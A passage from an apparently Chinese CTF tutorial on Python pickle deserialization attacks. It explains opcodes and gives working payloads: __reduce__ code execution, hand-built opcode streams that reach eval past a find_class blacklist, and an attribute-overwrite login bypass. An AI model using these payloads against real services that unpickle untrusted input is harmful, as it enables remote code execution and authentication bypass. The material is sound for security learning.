<td align="center">向栈中直接压入一个空字典</td>
<td align="center">}</td>
<td align="center">空字典入栈</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">p</td>
<td align="center">将栈顶对象储存至memo_n</td>
<td align="center">pn\n</td>
<td align="center">无</td>
<td align="center">对象被储存</td>
</tr>
<tr>
<td align="center">g</td>
<td align="center">将memo_n的对象压栈</td>
<td align="center">gn\n</td>
<td align="center">对象被压栈</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">0</td>
<td align="center">丢弃栈顶对象</td>
<td align="center">0</td>
<td align="center">栈顶对象被丢弃</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">b</td>
<td align="center">使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td>
<td align="center">b</td>
<td align="center">栈上第一个元素出栈</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">s</td>
<td align="center">将栈的第一个和第二个对象作为 key-value 对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td>
<td align="center">s</td>
<td align="center">第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">u</td>
<td align="center">寻找栈中的上一个 MARK，组合之间的数据（数据必须有偶数个，即呈 key-value 对）并全部添加或更新到该 MARK 之前的一个元素（必须为字典）中</td>
<td align="center">u</td>
<td align="center">MARK标记以及被组合的数据出栈，字典被更新</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">a</td>
<td align="center">将栈的第一个元素append到第二个元素(列表)中</td>
<td align="center">a</td>
<td align="center">栈顶元素出栈，第二个元素（列表）被更新</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">e</td>
<td align="center">寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td>
<td align="center">e</td>
<td align="center">MARK标记以及被组合的数据出栈，列表被更新</td>
<td align="center">无</td>
</tr>
</tbody></table>
<p>此外， <code>TRUE</code> 可以用 <code>I</code> 表示： <code>b&#39;I01\n&#39;</code> ； <code>FALSE</code> 也可以用 <code>I</code> 表示： <code>b&#39;I00\n&#39;</code> ，其他opcode可以在<a href="https://github.com/python/cpython/blob/master/Lib/pickle.py#L111">pickle库的源代码</a>中找到。</p>
<p>由这些 opcode 我们可以得到一些需要注意的地方：</p>
<ul>
<li>编写 opcode 时要想象栈中的数据，以正确使用每种 opcode。</li>
<li>在理解时注意与 python 本身的操作对照（比如 python 列表的<code>append</code>对应<code>a</code>、<code>extend</code>对应<code>e</code>；字典的<code>update</code>对应<code>u</code>）。</li>
<li><code>c</code>操作符会尝试<code>import</code>库，所以在<code>pickle.loads</code>时不需要漏洞代码中先引入系统库。</li>
<li>pickle 不支持列表索引、字典索引、点号取对象属性作为<strong>左值</strong>，需要索引时只能先获取相应的函数（如<code>getattr</code>、<code>dict.get</code>）才能进行。但是因为存在<code>s</code>、<code>u</code>、<code>b</code>操作符，<strong>作为右值是可以的</strong>。即“查值不行，赋值可以”。pickle 能够索引查值的操作只有<code>c</code>、<code>i</code>。而如何查值也是CTF的一个重要考点。</li>
<li><code>s</code>、<code>u</code>、<code>b</code>操作符可以构造并赋值原来没有的属性、键值对。</li>
</ul>
<h2 id="漏洞攻击"><a href="#漏洞攻击" class="headerlink" title="漏洞攻击"></a>漏洞攻击</h2><h3 id="借助-reduce-命令执行"><a href="#借助-reduce-命令执行" class="headerlink" title="借助__reduce__命令执行"></a>借助<code>__reduce__</code>命令执行</h3><p>举个简单的例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        a=<span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(a,)) <span class="comment">#a后面的逗号不能省略，因为参数不一定是一个</span></span><br><span class="line">    </span><br><span class="line">a=A()</span><br><span class="line">test=pickle.dumps(a)</span><br><span class="line">pickle.loads(test)</span><br><span class="line"><span class="comment">#会执行os.system(&#x27;whoami&#x27;)</span></span><br></pre></td></tr></table></figure>

<p>利用 <code>__reduce__</code> 构造恶意字符串，当这个字符串被反序列化的时候，<code>__reduce__</code>会被执行。</p>
<p>另一种写法是在内部导入 os 模块：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        a=<span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).system(a)&quot;</span>,))</span><br><span class="line">    </span><br><span class="line">a=A()</span><br><span class="line">test=pickle.dumps(a)</span><br><span class="line">pickle.loads(test)</span><br><span class="line"><span class="comment"># 会执行os.system(&#x27;whoami&#x27;)</span></span><br></pre></td></tr></table></figure>

<p>好处是代码没导入 os 模块的话也能执行。</p>
<p>本方法的解题思路：</p>
<ol>
<li>找 pickle 反序列化位点</li>
<li>本地重写 reduce 方法，生成序列化字符串</li>
<li>触发反序列化</li>
</ol>
<h3 id="手写-pickle-代码"><a href="#手写-pickle-代码" class="headerlink" title="手写 pickle 代码"></a>手写 pickle 代码</h3><p>先从一个例子熟悉一下一般的 pickle 代码的组成：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle, pickletools, os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        s = <span class="string">r&quot;&quot;&quot;ls -la&quot;&quot;&quot;</span> </span><br><span class="line">        <span class="comment"># &quot;&quot;&quot; 用来表示多行字符串</span></span><br><span class="line">        <span class="comment"># r&quot;&quot;&quot;ls -la&quot;&quot;&quot; 是一个原始字符串字面量，它表示包含文本 ls -la 的字符串。在 python 中，使用 r 前缀可以创建原始字符串，这意味着反斜杠字符 \ 将被视为普通字符，而不会被解释为转义字符。</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(exp(),protocol=<span class="number">0</span>)</span><br><span class="line">pickletools.dis(a)</span><br></pre></td></tr></table></figure>

<p>输出为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    0: c    GLOBAL     &#x27;nt system&#x27; # 向栈顶压入 nt.system 这个可执行对象</span><br><span class="line">   11: p    PUT        0 # 将这个对象存储到内存区的第0个位置</span><br><span class="line">   14: (    MARK # 压入一个元组的开始标志 </span><br><span class="line">   15: V        UNICODE    &#x27;ls -la&#x27; # 压入一个字符串</span><br><span class="line">   23: p        PUT        1 # 将这个字符串存储到内存区的第1个位置</span><br><span class="line">   26: t        TUPLE      (MARK at 14) # 将由刚压入栈中的元素弹出，再将由这个元素组成的元组压入栈中</span><br><span class="line">   27: p    PUT        2 # 将这个元组存储到内存区的第2个位置</span><br><span class="line">   30: R    REDUCE # 从栈上弹出两个元素，分别是可执行对象和元组，并执行，结果压入栈中</span><br><span class="line">   31: p    PUT        3 # 将栈顶的元素（也就是刚才执行的结果）存储到内存区的第3个位置</span><br><span class="line">   34: .    STOP # 结束整个程序</span><br><span class="line">highest protocol among opcodes = 0</span><br></pre></td></tr></table></figure>

<p>注意：第一行的 nt 表示 windows 系统，posix 表示 Linux 系统，双端不互通。</p>
<p>显然，这里的内存区是没有起到任何作用的。所以我们可以将这段代码进一步简化，去除存储内存区的过程：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle, builtins <span class="comment"># 这里建议导入builtins，否则在一些情况下会出现问题</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;&quot;cnt</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(Vls -la</span></span><br><span class="line"><span class="string">tR.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">pickle.loads(payload)</span><br></pre></td></tr></table></figure>

<p>使用 <code>b</code> 前缀表示数据是以字节为单位的字节字符串（bytes），而不是 Unicode 字符。字节字符串是以字节为单位的不可变序列。</p>
<p>发现可以运行并输出结果，很好。接着我们尝试编写绕过的代码。下面的注释中详细描述了整个过程，<code>metastack</code>和<code>stack</code>是<code>_unframer</code>中的两个不同的list（调试过程中）。其中每个OPCODE的操作我都用分号隔开了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cbuiltins <span class="comment">#设置builtins为可执行对象</span></span><br><span class="line"><span class="built_in">getattr</span> <span class="comment">#获取builtins.getattr函数，而且被存放在stack中</span></span><br><span class="line">(cbuiltins <span class="comment">#getattr函数从stack中弹出，被圧入metastack；设置builtins为可执行对象</span></span><br><span class="line"><span class="built_in">dict</span> <span class="comment">#获取builtins.dict对象（因为globals是字典类型的），得到的dict类型被存放在stack中</span></span><br><span class="line">S<span class="string">&#x27;get&#x27;</span> <span class="comment">#将&quot;get&quot;字符串压入stack中</span></span><br><span class="line">tR(cbuiltins <span class="comment">###弹出metastack中的getattr函数，圧入stack中，然后使顶层的builtins.dict,&#x27;get&#x27;组成元组，</span></span><br><span class="line">   <span class="comment">###再将这整个结果圧入栈中（这时getattr函数和新组成的元组均被存放在stack中，而metastack为空）；</span></span><br><span class="line">   <span class="comment">###随后执行builtins.getattr(builtins.dict,&#x27;get&#x27;)，使得metastack为空，而stack中是结果，也就是对dict类型的get方法；</span></span><br><span class="line">   <span class="comment">###之后get方法从stack弹出并圧入metastack；最后设置builtins为可执行对象</span></span><br><span class="line"><span class="built_in">globals</span> <span class="comment">#获取builtins.globals，被存放在stack中（这时metastack为get方法而stack中是builtins.globals）</span></span><br><span class="line">(tRS<span class="string">&#x27;builtins&#x27;</span> <span class="comment">###将builtins.globals从stack中弹出并圧入metastack，这时metastack含有get方法和globals函数，而stack为空；</span></span><br><span class="line">   <span class="comment">###从metastack中弹出globals函数至stack，生成了一个空元组并被圧入stack；命令执行globals()，且将结果圧入stack；</span></span><br><span class="line">   <span class="comment">###随后&quot;builtins&quot;字符串被圧入stack栈中</span></span><br><span class="line">tRp1 <span class="comment">###从metastack中弹出get函数至stack中（这时metastack已经空了），原先在stack顶层的&quot;builtins&quot;字符串和globals()的结果组成一个新元组；</span></span><br><span class="line">   <span class="comment">###命令执行dict.get(globals(),&quot;builtins&quot;)，生成的结果圧入stack中；将stack顶部的内容存到memo的里，编号为1</span></span><br><span class="line">. <span class="comment">#结束的标志</span></span><br></pre></td></tr></table></figure>

<p>以上所有内容相当于这样的一句Python命令：<code>import builtins;dict.get(globals(),&quot;builtins&quot;)</code>，也就是取得了<code>builtins</code>对象。在此基础上，我们继续去获取<code>eval</code>函数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cbuiltins</span><br><span class="line"><span class="built_in">getattr</span></span><br><span class="line">(cbuiltins</span><br><span class="line"><span class="built_in">dict</span></span><br><span class="line">S<span class="string">&#x27;get&#x27;</span></span><br><span class="line">tR(cbuiltins</span><br><span class="line"><span class="built_in">globals</span></span><br><span class="line">(tRS<span class="string">&#x27;builtins&#x27;</span></span><br><span class="line">tRp1 <span class="comment"># memo1为builtins对象</span></span><br><span class="line">cbuiltins</span><br><span class="line"><span class="built_in">getattr</span></span><br><span class="line">(g1 <span class="comment">#获取builtins对象</span></span><br><span class="line">S<span class="string">&#x27;eval&#x27;</span></span><br><span class="line">tR(S<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls -la&quot;)&#x27;</span> <span class="comment">#等同于builtins.getattr(builtins,&quot;eval&quot;)并将这个可调用的eval对象压入栈中</span></span><br><span class="line">tR. <span class="comment">#等同于eval(&quot;__import__(&#x27;os).system(&#x27;ls&#x27;)&quot;)并结束程序的运行</span></span><br></pre></td></tr></table></figure>

<p>由于之前仔细描述了类似的内容，这部分就不多赘述了，针对此题后半部分的exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"></span><br><span class="line">__all__ = (<span class="string">&#x27;PickleSerializer&#x27;</span>, )</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    blacklist = &#123;<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&quot;builtins&quot;</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %</span><br><span class="line">                                     (module, name))</span><br><span class="line">        </span><br><span class="line">payload = <span class="string">b&quot;&quot;&quot;cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">dict</span></span><br><span class="line"><span class="string">S&#x27;get&#x27;</span></span><br><span class="line"><span class="string">tR(cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS&#x27;builtins&#x27;</span></span><br><span class="line"><span class="string">tRp1</span></span><br><span class="line"><span class="string">cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(g1</span></span><br><span class="line"><span class="string">S&#x27;eval&#x27;</span></span><br><span class="line"><span class="string">tR(S&#x27;__import__(&quot;os&quot;).system(&quot;ls -la&quot;)&#x27;</span></span><br><span class="line"><span class="string">tR.&quot;&quot;&quot;</span></span><br><span class="line">RestrictedUnpickler(io.BytesIO(payload)).load()</span><br></pre></td></tr></table></figure>

<p>如果遇到需要不同pickle代码的情形，还可以参考<a href="https://github.com/sensepost/anapickle/blob/master/anapickle.py">这个项目</a>或者干脆使用<a href="https://github.com/eddieivan01/pker">这个工具pker</a>；提一句，使用pker生成和以上效果一致的payload是这样写的：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">getattr</span>=GLOBAL(<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;getattr&#x27;</span>)</span><br><span class="line"><span class="built_in">dict</span>=GLOBAL(<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;dict&#x27;</span>)</span><br><span class="line">dict_get=<span class="built_in">getattr</span>(<span class="built_in">dict</span>,<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">glo_dic=GLOBAL(<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>)()</span><br><span class="line">builtins=dict_get(glo_dic,<span class="string">&#x27;builtins&#x27;</span>)</span><br><span class="line"><span class="built_in">eval</span>=<span class="built_in">getattr</span>(builtins,<span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;ls -la&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br></pre></td></tr></table></figure>

<h4 id="拼接-opcode"><a href="#拼接-opcode" class="headerlink" title="拼接 opcode"></a>拼接 opcode</h4><p>将第一个 pickle 流结尾表示结束的 <code>.</code> 去掉，将第二个 pickle 流与第一个拼接起来即可。</p>
<h2 id="过滤与绕过"><a href="#过滤与绕过" class="headerlink" title="过滤与绕过"></a>过滤与绕过</h2><h3 id="黑名单过滤"><a href="#黑名单过滤" class="headerlink" title="黑名单过滤"></a>黑名单过滤</h3><p>有一种过滤方式：不禁止<code>R</code>指令码，但是对<code>R</code>执行的函数有黑名单限制。典型的例子是2018-XCTF-HITB-WEB : Python’s-Revenge。给了好长好长一串黑名单：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">black_type_list = [<span class="built_in">eval</span>, execfile, <span class="built_in">compile</span>, <span class="built_in">open</span>, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.<span class="built_in">open</span>, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.<span class="built_in">open</span>, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.<span class="built_in">open</span>, posixfile.fileopen]</span><br></pre></td></tr></table></figure>

<p>可惜<code>platform.popen()</code>不在名单里，它可以做到类似<code>system</code>的功能。这题死于黑名单有漏网之鱼。</p>
<p>另外，还有一个解（估计是出题人的预期解），那就是利用 map 来干这件事：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line"> 	<span class="keyword">return</span> <span class="built_in">map</span>,(os.system,[<span class="string">&quot;ls&quot;</span>])</span><br></pre></td></tr></table></figure>

<p>总之，黑名单不可取。要禁止reduce这一套方法，最稳妥的方式是禁止掉<code>R</code>这个指令码。</p>
<h3 id="过滤-R"><a href="#过滤-R" class="headerlink" title="过滤 R"></a>过滤 R</h3><p>这个可以很方便地利用 <code>pickletools.genops</code> 来实现。如果 reduce 这一套手段被过滤，我们应该如何利用呢？</p>
<h4 id="全局变量包含：c指令码"><a href="#全局变量包含：c指令码" class="headerlink" title="全局变量包含：c指令码"></a>全局变量包含：<code>c</code>指令码</h4><p>还记得我们的<code>c</code>指令码吗？它专门用来获取一个全局变量。</p>
<p>先来看一个简单的例子：</p>
<p>两个文件要放在同一个文件夹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># test.py</span></span><br><span class="line"><span class="keyword">import</span> pickle, base64</span><br><span class="line"><span class="keyword">import</span> A   </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, num, passwd</span>):</span><br><span class="line">        self.num = num</span><br><span class="line">        self.passwd = passwd</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self,other</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">type</span>(other) <span class="keyword">is</span> B <span class="keyword">and</span> self.passwd == other.passwd <span class="keyword">and</span> self.num == other.num</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> data):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;NO REDUCE!!!&#x27;</span></span><br><span class="line">    x = pickle.loads(data)</span><br><span class="line">    <span class="keyword">if</span> (x != B(A.num, A.passwd)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;False!!!&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Now A.num == &#123;&#125; AND A.passwd == &#123;&#125;.&#x27;</span>.<span class="built_in">format</span>(A.num, A.passwd))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Success!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(check(base64.b64decode(<span class="built_in">input</span>())))</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># A.py</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line">passwd = <span class="string">&quot;password&quot;</span></span><br></pre></td></tr></table></figure>

<p>我们先弄一个正常的 B 来看看序列化之后的效果：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle, pickletools, base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, num, passwd</span>):</span><br><span class="line">        self.num = num</span><br><span class="line">        self.passwd = passwd</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self,other</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">type</span>(other) <span class="keyword">is</span> B <span class="keyword">and</span> self.passwd == other.passwd <span class="keyword">and</span> self.num == other.num</span><br><span class="line"></span><br><span class="line">data = pickle.dumps(B(<span class="number">1</span>, <span class="string">&quot;qaq&quot;</span>),protocol=<span class="number">3</span>)</span><br><span class="line">data = pickletools.optimize(data)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">pickletools.dis(data)</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>：第 11 行并置<code>protocol</code>系数的值为 3，输出的内容会依据 protocol 的值而改变</p>
<p><img src="https://s2.loli.net/2024/03/20/AkYGe9vFfhZVj8L.png" alt="sp240320_174055"></p>
<p>如何用<code>c</code>指令来换掉这两个字符串呢？</p>
<p>以 num 的为例，只需要把硬编码的<code>1</code>改成从<code>A</code>引入的<code>num</code>，写成指令就是：<code>cA\nnum\n</code>。同理，硬编码的<code>qaq</code>改成从<code>A</code>引入的<code>passwd</code>为 <code>cA\npasswd\n</code></p>
<p>把用于编码<code>1</code>的<code>K\x01</code>和编码<code>qaq</code>的<code>\x8c\x03qaq</code>替换成我们的这个 global 指令，来看看改造之后的效果：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">payload = <span class="string">b&#x27;\x80\x03c__main__\nB\n)\x81&#125;(X\x03\x00\x00\x00numcA\nnum\nX\x06\x00\x00\x00passwdcA\npasswd\nub.&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(payload)) </span><br><span class="line"><span class="comment"># b&#x27;gANjX19tYWluX18KQgopgX0oWAMAAABudW1jQQpudW0KWAYAAABwYXNzd2RjQQpwYXNzd2QKdWIu&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/03/20/LWg26qsUCNGRMlE.png" alt="sp240320_173915"></p>
<p>顺带一提，由于 pickle 导出的字符串里面有很多的不可见字符，所以一般都经过 base64 编码之后传输。</p>
<h4 id="绕过c指令模块限制：先读入，再篡改"><a href="#绕过c指令模块限制：先读入，再篡改" class="headerlink" title="绕过c指令模块限制：先读入，再篡改"></a>绕过<code>c</code>指令模块限制：先读入，再篡改</h4><p>依旧以刚刚出现的样题为例，但额外加上模块只能为<code>__main__</code>的限制。</p>
<p><code>c</code>指令（也就是 GLOBAL 指令）基于<code>find_class</code>这个方法， 然而<code>find_class</code>可以被出题人重写。如果出题人只允许<code>c</code>指令包含<code>__main__</code>这一个模块（就没法进行类似于 A.num 这样的引入），这道题又该如何解决呢？</p>
<p>通过 GLOBAL 指令引入的变量，可以看作是原变量的引用。我们在栈上修改它的值，会导致原变量也被修改！</p>
<p>有了这个知识作为前提，我们可以干这么一件事：</p>
<ul>
<li>通过<code>__main__.A</code>引入这一个模块，由于命名空间还在 main 内，故不会被拦截</li>
<li>把一个 dict 压进栈，内容是<code>&#123;&#39;num&#39;: 6, &#39;passwd&#39;: &#39;123456&#39;&#125;</code></li>
<li>执行<code>b</code>指令，其作用是修改<code>__dict__</code>中的内容，在<code>__main__.A.num</code>和<code>__main__.A.passwd</code>中的内容已经被修改了，至此<code>A.num</code>和<code>A.passwd</code>已经被篡改成我们想要的内容</li>
<li>将栈清空，也就是弹掉栈顶</li>
<li>照抄正常的 B 序列化之后的字符串，压入一个正常的 B 对象，num 和 passwd 分别是 6 和 ‘123456’ ，这样判断就能够通过了</li>
</ul>
<p>可见 payload 的思路就是先修改了 A 中的变量值，随后以正常的格式传入可被 check 函数通过的内容。</p>
<p>借助刚刚的图和先前得到的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\nB\n)\x81&#125;</span><br><span class="line">(X\x03\x00\x00\x00numK\x01X\x06\x00\x00\x00passwdX\x03\x00\x00\x00qaqub.&#x27;</span><br></pre></td></tr></table></figure>

<p>我们来对它进行一定的修改。</p>
<ul>
<li><p>将<code>K\x01</code>改为<code>K\x06</code>，将<code>X\x03\x00\x00\x00qaq</code>改为<code>X\x06\x00\x00\x00123456</code>，此时：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\nB\n)</span><br><span class="line">\x81&#125;(X\x03\x00\x00\x00numK\x06X\x06\x00\x00\x00passwdX\x06\x00\x00\x00123456ub.&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p>将开头的<code>\x80\x03c__main__\nB\n)</code>改为<code>\x80\x03c__main__\nA\n&#125;(Vnum\nK\x06Vpasswd\nV123456\nub0c__main__\nB\n)</code>，这里可以看到我们圧入了一个正常的对象，此时得到最终payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\nA\n&#125;(Vnum\nK\x06Vpasswd\nV123456\nub0c__main__\nB\n)</span><br><span class="line">\x81&#125;(X\x03\x00\x00\x00numK\x06X\x06\x00\x00\x00passwdX\x06\x00\x00\x00123456ub.&#x27;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>我们来测试一下 payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64,pickletools</span><br><span class="line">payload = pickletools.optimize(<span class="string">b&#x27;\x80\x03c__main__\nA\n&#125;(Vnum\nK\x06Vpasswd\nV123456\nub0c__main__\nB\n)\x81&#125;(X\x03\x00\x00\x00numK\x06X\x06\x00\x00\x00passwdX\x06\x00\x00\x00123456ub.&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(base64.b64encode(payload)), encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># gANjX19tYWluX18KQQp9KFZudW0KSwZWcGFzc3dkClYxMjM0NTYKdWIwY19fbWFpbl9fCkIKKYF9KFgDAAAAbnVtSwZYBgAAAHBhc3N3ZFgGAAAAMTIzNDU2dWIu</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/03/20/YdovPZSn39i4zbx.png" alt="image-20240320182513079"></p>
<p>可见内存中A的属性值已经被修改了，于是我们通过另一个手段实现了登录验证的绕过。</p>
<h4 id="无R指令下的命令执行"><a href="#无R指令下的命令执行" class="headerlink" title="无R指令下的命令执行"></a>无<code>R</code>指令下的命令执行</h4><p>还是刚才的样题，但这次的要求并不是绕过登录限制，而是在不出现<code>R</code>指令的情况下 getshell。</p>
<p>前谈到过，<code>__reduce__</code>与<code>R</code>指令是绑定的，禁止了<code>R</code>指令就禁止了<code>__reduce__</code> 方法。那么，在禁止<code>R</code>指令的情况下，我们还能 RCE 吗？</p>
<p>之前的<code>R</code>指令触发的真正语句其实是<code>func(*args)</code>，那么我们就继续在<code>pickle.py</code>中寻找一些可用的语句。那什么样的是可用的呢？也就是<code>*args</code>可控，<code>func</code>可控或者就是类似于<code>system,exec</code>这样的功能，可以以<code>load_</code>为关键词进行搜索。现在的目标是，利用指令码，构造出任意命令执行。那么我们需要找到一个函数调用<code>fun(arg)</code>，其中<code>fun</code>和<code>arg</code>都必须可控。这部分其实已经有人进行过总结了，可进行函数执行的操作码有<code>R</code>，<code>i</code>，<code>o</code>，<code>b</code>。</p>
<h5 id="操作码b"><a href="#操作码b" class="headerlink" title="操作码b"></a>操作码<code>b</code></h5><p>它对应的函数为<code>load_build</code>。其在pickle.py中的内容如下：</p>
